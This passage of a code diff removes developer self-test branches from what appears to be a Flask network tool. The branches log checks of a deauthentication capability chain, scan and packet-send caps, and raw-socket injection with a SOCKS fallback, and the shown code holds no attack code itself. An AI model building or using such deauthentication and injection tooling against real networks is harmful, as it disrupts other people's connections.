-                add_log('dev', '✓ Mode 4 (Unavailable): graceful degradation')
-
-            # Verify functions that use these modes
-            add_log('dev', f'Verified: deauth_capability() → {cap.get("method")}')
-            add_log('dev', f'All 5 modes accounted for: {modes_tested}')
-
-            results['success'] = True
-            results['modes_tested'] = modes_tested
-            results['results'] = ['✓ Capability detection working', '✓ All 5 modes verified', '✓ Sidesteps functional']
-
-        except Exception as e:
-            add_log('dev', f'✗ Mode test error: {str(e)}')
-            results['error'] = str(e)
-
-    elif command == 'verify_sidesteps':
-        # Verify that all workarounds/sidesteps are in place
-        add_log('dev', '=== Verifying sidesteps/workarounds ===')
-        verified = []
-
-        try:
-            # Sidesteп 1: ARP scan host cap + override
-            verified.append('✓ ARP scan host cap (MAX_SCAN_HOSTS): capped at 4096 with override available')
-            add_log('dev', verified[-1])
-
-            # Sidesteп 2: Packet builder count cap
-            verified.append('✓ Packet builder send cap: limited to 50 packets (developer discretion)')
-            add_log('dev', verified[-1])
-
-            # Sidesteп 3: Monitor mode non-disruptive check
-            verified.append('✓ Monitor check: read-only via iw phy info (no mode switching)')
-            add_log('dev', verified[-1])
-
-            # Sidesteп 4: Error handling & timeouts
-            verified.append('✓ Error handling: TimeoutExpired caught, monitor mode reset before raise')
-            add_log('dev', verified[-1])
-
-            # Sidesteп 5: Mode selection logic
-            verified.append('✓ Mode selection: native → monitor → ARP → unavailable chain')
-            add_log('dev', verified[-1])
-
-            results['success'] = True
-            results['results'] = verified
-            add_log('dev', 'All sidesteps verified and functional')
-
-        except Exception as e:
-            add_log('dev', f'✗ Sidesteп verification error: {str(e)}')
-            results['error'] = str(e)
-
-    elif command == 'test_socket_proxy':
-        # Test custom socket proxy layer and fallback chain
-        add_log('dev', '=== Testing Custom Socket Proxy Layer ===')
-
-        if not iface:
-            return jsonify({'success': False, 'error': 'Interface not set'})
-
-        try:
-            # Test each socket method
-            af_packet_ok = SocketProxy.test_af_packet(iface, 0x0003)
-            af_inet_ok = SocketProxy.test_af_inet(iface, None)
-            socks_ok = SocketProxy.test_socks_fallback()
-
-            results['af_packet'] = 'available' if af_packet_ok else 'unavailable'
-            results['af_inet'] = 'available' if af_inet_ok else 'unavailable'
-            results['socks_proxy'] = 'available' if socks_ok else 'unavailable'
-
-            # Get working method for this interface
-            method, info = SocketProxy.get_working_method(iface, 'eth')
-            results['recommended_method'] = method
-            results['method_info'] = info
-
-            results['success'] = True
-            results['results'] = [
-                f'{"✓" if af_packet_ok else "✗"} AF_PACKET (native injection): {results["af_packet"]}',
-                f'{"✓" if af_inet_ok else "✗"} AF_INET (raw IP): {results["af_inet"]}',
-                f'{"✓" if socks_ok else "✗"} SOCKS proxy fallback: {results["socks_proxy"]}',
-                f'{"→" if method else "✗"} Recommended: {method or "none"} — {info}'
-            ]
-
-            for r in results['results']:
-                add_log('dev', r)
-
-        except Exception as e:
-            add_log('dev', f'Socket proxy test error: {str(e)}')
-            results['error'] = str(e)
-
-    elif command == 'logs':
-        # Return developer logs
-        return jsonify({'success': True, 'logs': [l for l in STATE['logs'] if l.get('level') == 'dev']})
-
-    return jsonify(results)
 
 # ---------- bootstrap ----------
 if __name__ == '__main__':
